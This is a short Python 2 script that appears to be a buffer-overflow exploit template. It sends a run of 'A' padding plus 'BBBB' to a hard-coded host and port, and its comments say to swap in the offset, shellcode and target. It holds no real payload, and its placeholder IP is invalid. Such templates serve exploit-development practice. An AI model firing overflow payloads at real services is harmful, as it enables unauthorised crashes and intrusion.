#!/usr/bin/python
import sys, socket

shellcode = "A" * 100  #replace 100 with offset
shellcode += "BBBB" #Replace this with whatever you need to append to the shellcode

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.324.54',23365)) #put host IP and application port here
	
	s.send((shellcode))
	s.close()
except:
	print "Connection error"
sys.exit()
